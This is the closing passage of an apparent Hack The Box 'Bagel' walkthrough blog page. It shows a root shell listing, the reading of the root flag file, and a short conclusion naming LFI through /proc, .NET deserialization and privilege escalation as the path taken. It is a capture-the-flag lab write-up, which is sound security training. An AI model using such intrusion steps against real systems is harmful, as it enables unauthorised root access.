+</span></span><span class=line><span class=cl>-rwxr-xr-x.  <span class=m>1</span> root root <span class=m>16200</span> Oct <span class=m>23</span> 19:41 bagel
+</span></span><span class=line><span class=cl>lrwxrwxrwx.  <span class=m>1</span> root root     <span class=m>9</span> Jan <span class=m>20</span> 17:59 .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl>-rw-r--r--.  <span class=m>1</span> root root    <span class=m>18</span> Jan <span class=m>21</span>  <span class=m>2022</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r--.  <span class=m>1</span> root root   <span class=m>141</span> Jan <span class=m>21</span>  <span class=m>2022</span> .bash_profile
+</span></span><span class=line><span class=cl>-rw-r--r--.  <span class=m>1</span> root root   <span class=m>429</span> Jan <span class=m>21</span>  <span class=m>2022</span> .bashrc
+</span></span><span class=line><span class=cl>-rw-r--r--.  <span class=m>1</span> root root   <span class=m>100</span> Jan <span class=m>21</span>  <span class=m>2022</span> .cshrc
+</span></span><span class=line><span class=cl>drwxr-xr-x.  <span class=m>4</span> root root  <span class=m>4096</span> Apr  <span class=m>8</span> 20:50 .dotnet
+</span></span><span class=line><span class=cl>drwxr-xr-x.  <span class=m>3</span> root root    <span class=m>19</span> Oct <span class=m>22</span> 21:12 .local
+</span></span><span class=line><span class=cl>drwxr-xr-x.  <span class=m>4</span> root root    <span class=m>35</span> Oct <span class=m>22</span> 21:12 .nuget
+</span></span><span class=line><span class=cl>-rw-r-----.  <span class=m>1</span> root root    <span class=m>33</span> Apr  <span class=m>7</span> 07:21 root.txt
+</span></span><span class=line><span class=cl>drwx------.  <span class=m>2</span> root root    <span class=m>25</span> Jan <span class=m>26</span> 19:44 .ssh
+</span></span><span class=line><span class=cl>-rw-r--r--.  <span class=m>1</span> root root   <span class=m>129</span> Jan <span class=m>21</span>  <span class=m>2022</span> .tcshrc
+</span></span><span class=line><span class=cl>drwxr-xr-x.  <span class=m>4</span> root root    <span class=m>39</span> Oct <span class=m>22</span> 21:12 .templateengine
+</span></span><span class=line><span class=cl>-rw-------.  <span class=m>1</span> root root   <span class=m>532</span> Feb <span class=m>14</span> 11:53 .viminfo
+</span></span><span class=line><span class=cl>sh-5.2# cat /root/root.txt
+</span></span><span class=line><span class=cl>095531d4ca9a340c67f09d86bd6f5d25
+</span></span></code></pre></td></tr></table></div></div><p>Easy &ndash; we have the root flag!</p><h2 id=conclusion>Conclusion</h2><p>Using the proc filesystem to further enumerate the machine via LFI was a cool little trick that took a little while for me to discover. I enjoyed the curveball of expecting to attack a Python app, but surprisingly shifting focus to attacking .NET running on Linux &ndash; something I have not previously had experience with. Thankfully after gaining a foothold, privilege escalation to root was a relatively easy and obvious path. Overall, this was something a little different and interesting.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-06-03&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/89cd891e455fc535b6d02c3871fac9ed1adf0216 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) 89cd891e455fc535b6d02c3871fac9ed1adf0216: Add bagel walkthrough">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>89cd891</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-06-03-bagel-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-06-03-bagel-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-06-03-bagel-htb/ data-title="Bagel HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-06-03-bagel-htb/ data-title="Bagel HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-06-03-bagel-htb/ data-title="Bagel HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/.net/>.NET</a>,&nbsp;<a href=/tags/json/>JSON</a>,&nbsp;<a href=/tags/deserialization/>deserialization</a>,&nbsp;<a href=/tags/socket/>socket</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-05-13-interface-htb/ class=prev rel=prev title="Interface HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Interface HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
